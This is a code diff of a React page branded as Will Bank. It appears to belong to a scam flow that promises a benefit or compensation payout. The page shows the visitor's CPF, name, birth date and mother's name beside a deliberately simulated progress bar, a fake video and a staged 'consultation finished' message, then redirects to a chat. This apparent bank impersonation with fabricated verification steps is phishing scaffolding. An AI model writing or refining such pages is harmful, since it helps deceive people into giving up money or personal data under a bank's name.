@@ -1,179 +1,121 @@
 import { useEffect, useState } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
-import { Card, CardContent } from "@/components/ui/card";
-import { Button } from "@/components/ui/button";
-import { Play, ArrowRight, Clock, AlertCircle } from "lucide-react";
-import willbankLogo from "@/assets/willbank-logo.png";
+import { CreditCard, User, Calendar, Users, Search, Volume2 } from "lucide-react";
+import WillBankHeader from "@/components/WillBankHeader";
+import WillBankCard from "@/components/WillBankCard";
 import { CPFData } from "@/lib/cpf";
+import { Progress } from "@/components/ui/progress";
 
 const Video = () => {
   const navigate = useNavigate();
   const location = useLocation();
-  const [isPlaying, setIsPlaying] = useState(false);
-  const [canContinue, setCanContinue] = useState(false);
-  const [timeRemaining, setTimeRemaining] = useState(30);
+  const [progress, setProgress] = useState(0);
+  const [showConsulta, setShowConsulta] = useState(false);
 
   const cpfData: CPFData | undefined = location.state?.cpfData;
-  const valorBeneficio: number | undefined = location.state?.valorBeneficio;
 
   useEffect(() => {
-    if (!cpfData || !valorBeneficio) {
+    if (!cpfData) {
       navigate("/");
       return;
     }
-  }, [cpfData, valorBeneficio, navigate]);
 
-  useEffect(() => {
-    let timer: NodeJS.Timeout;
-    
-    if (isPlaying && timeRemaining > 0) {
-      timer = setInterval(() => {
-        setTimeRemaining((prev) => {
-          if (prev <= 1) {
-            setCanContinue(true);
-            return 0;
-          }
-          return prev - 1;
-        });
-      }, 1000);
-    }
+    // Simular progresso de loading
+    const interval = setInterval(() => {
+      setProgress(prev => {
+        if (prev >= 100) {
+          clearInterval(interval);
+          setShowConsulta(true);
+          // Após mostrar consulta, navegar para chat
+          setTimeout(() => {
+            navigate("/chat", { state: { cpfData } });
+          }, 3000);
+          return 100;
+        }
+        return prev + 1;
+      });
+    }, 50);
 
-    return () => clearInterval(timer);
-  }, [isPlaying, timeRemaining]);
+    return () => clearInterval(interval);
+  }, [cpfData, navigate]);
 
-  const handlePlay = () => {
-    setIsPlaying(true);
-  };
+  if (!cpfData) return null;
 
-  const handleContinuar = () => {
-    navigate("/saque", { state: { cpfData, valorBeneficio } });
-  };
-
-  if (!cpfData || !valorBeneficio) return null;
+  const dataFields = [
+    { icon: CreditCard, value: cpfData.cpf },
+    { icon: User, value: cpfData.nome },
+    { icon: Calendar, value: cpfData.dataNascimento },
+    { icon: Users, value: cpfData.nomeMae },
+  ];
 
   return (
     <div className="min-h-screen bg-background flex flex-col">
-      {/* Header */}
-      <header className="bg-card border-b border-border px-6 py-4">
-        <div className="max-w-4xl mx-auto">
-          <div className="flex items-center justify-between mb-4">
-            <img src={willbankLogo} alt="Will Bank" className="h-10 object-contain" />
-          </div>
-          <div className="flex items-center gap-2 text-sm text-muted-foreground">
-            <span>Benefício</span>
-            <span>›</span>
-            <span>Indenização</span>
-            <span>›</span>
-            <span className="text-foreground font-medium">Instruções</span>
-          </div>
-        </div>
-      </header>
+      <WillBankHeader userName={cpfData.nome.split(' ')[0].toUpperCase()} />
 
-      {/* Main Content */}
       <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
-        <Card className="w-full max-w-lg shadow-xl border-0 overflow-hidden">
-          <div className="bg-primary h-2" />
-          
-          <CardContent className="p-6 sm:p-8 space-y-6">
-            <div className="text-center space-y-2">
-              <h1 className="text-2xl font-bold text-foreground">
-                Instruções importantes
-              </h1>
-              <p className="text-muted-foreground">
-                Assista ao vídeo abaixo para saber como realizar o saque do seu benefício
-              </p>
-            </div>
+        <WillBankCard className="w-full max-w-2xl">
+          <div className="space-y-6">
+            {/* Progress bar at top */}
+            <Progress value={progress} className="h-1.5" />
 
-            {/* Video Player */}
-            <div className="relative aspect-video bg-black rounded-xl overflow-hidden">
-              {!isPlaying ? (
-                <button
-                  onClick={handlePlay}
-                  className="absolute inset-0 flex flex-col items-center justify-center bg-gradient-to-b from-black/50 to-black/80 hover:from-black/40 hover:to-black/70 transition-all"
-                >
-                  <div className="w-20 h-20 bg-primary rounded-full flex items-center justify-center mb-4 hover:scale-110 transition-transform">
-                    <Play className="w-10 h-10 text-primary-foreground ml-1" />
-                  </div>
-                  <span className="text-white font-medium">Clique para assistir</span>
-                </button>
-              ) : (
-                <div className="absolute inset-0 flex flex-col items-center justify-center bg-gradient-to-b from-gray-900 to-black">
-                  {/* Placeholder video content */}
-                  <div className="text-center text-white px-6">
-                    <AlertCircle className="w-12 h-12 mx-auto mb-4 text-primary" />
-                    <h3 className="text-lg font-semibold mb-2">
-                      Vídeo de Instruções
-                    </h3>
-                    <p className="text-sm text-gray-300 mb-4">
-                      Aguarde o vídeo carregar ou adicione o link do vídeo nas configurações
-                    </p>
-                    <div className="flex items-center justify-center gap-2 text-primary">
-                      <Clock className="w-4 h-4" />
-                      <span className="text-sm font-medium">
-                        {timeRemaining > 0 ? `Aguarde ${timeRemaining}s...` : "Pronto!"}
-                      </span>
-                    </div>
+            {/* Video Placeholder */}
+            <div className="relative aspect-video bg-gradient-to-br from-blue-900 via-blue-800 to-purple-900 rounded-xl overflow-hidden">
+              {/* Fake video content */}
+              <div className="absolute inset-0 flex items-center justify-center">
+                <div className="text-center">
+                  <div className="w-48 h-48 mx-auto bg-primary rounded-lg flex items-center justify-center mb-4">
+                    <span className="text-6xl">👩‍💼</span>
                   </div>
                 </div>
-              )}
-            </div>
-
-            {/* Value Reminder */}
-            <div className="bg-primary/10 rounded-lg p-4 text-center border border-primary/20">
-              <p className="text-sm text-muted-foreground mb-1">
-                Seu benefício disponível:
-              </p>
-              <p className="text-2xl font-bold text-primary">
-                R$ {valorBeneficio.toLocaleString('pt-BR')},00
-              </p>
-            </div>
-
-            {/* Progress / Timer */}
-            {isPlaying && !canContinue && (
-              <div className="flex items-center justify-center gap-2 text-muted-foreground">
-                <Clock className="w-4 h-4 animate-pulse" />
-                <span className="text-sm">
-                  Aguarde {timeRemaining} segundos para continuar...
-                </span>
               </div>
-            )}
+              
+              {/* Audio Button Overlay */}
+              <button className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-primary text-primary-foreground px-6 py-3 rounded-full flex items-center gap-2 font-semibold shadow-lg hover:bg-primary/90 transition">
+                <Volume2 className="w-5 h-5" />
+                Clique para ouvir
+              </button>
 
-            {/* CTA Button */}
-            <Button 
-              onClick={handleContinuar}
-              disabled={!canContinue}
-              className="w-full h-12 text-base font-semibold"
-            >
-              {canContinue ? (
-                <>
-                  Continuar para o saque
-                  <ArrowRight className="w-5 h-5" />
-                </>
-              ) : (
-                <>
-                  <Clock className="w-5 h-5" />
-                  Assista o vídeo para continuar
-                </>
-              )}
-            </Button>
+              {/* Video controls */}
+              <div className="absolute top-4 right-4 flex gap-2">
+                <button className="bg-black/50 text-white px-3 py-1 rounded text-xs">
+                  📋 Desanexar vídeo
+                </button>
+                <button className="bg-black/50 text-white px-3 py-1 rounded text-xs">
+                  ⏭️ RGX
+                </button>
+              </div>
+            </div>
 
-            {!isPlaying && (
-              <p className="text-xs text-center text-muted-foreground">
-                É obrigatório assistir ao vídeo antes de prosseguir com o saque
-              </p>
-            )}
-          </CardContent>
-        </Card>
+            {/* User Data Card */}
+            <div className="border-2 border-primary rounded-xl overflow-hidden">
+              {/* Yellow top border already from Card */}
+              <div className="divide-y divide-gray-100">
+                {dataFields.map((field, index) => {
+                  const Icon = field.icon;
+                  return (
+                    <div key={index} className="flex items-center gap-4 p-4">
+                      <div className="w-10 h-10 bg-primary/10 rounded-full flex items-center justify-center">
+                        <Icon className="w-5 h-5 text-primary" />
+                      </div>
+                      <span className="font-medium text-foreground">{field.value}</span>
+                    </div>
+                  );
+                })}
+                
+                {/* Consulta Status */}
+                <div className="flex items-center gap-4 p-4 bg-primary/10">
+                  <div className="w-10 h-10 bg-primary/20 rounded-full flex items-center justify-center">
+                    <Search className="w-5 h-5 text-primary" />
+                  </div>
+                  <span className="text-muted-foreground">
+                    {showConsulta ? "Consulta finalizada!" : "Sua consulta está em andamento..."}
+                  </span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </WillBankCard>
       </main>
-
-      {/* Footer */}
-      <footer className="bg-primary text-primary-foreground px-6 py-4">
-        <div className="max-w-4xl mx-auto text-center">
-          <p className="text-sm opacity-80">
-            © 2025 Will Bank. Todos os direitos reservados.
-          </p>
-        </div>
-      </footer>
     </div>
   );
 };
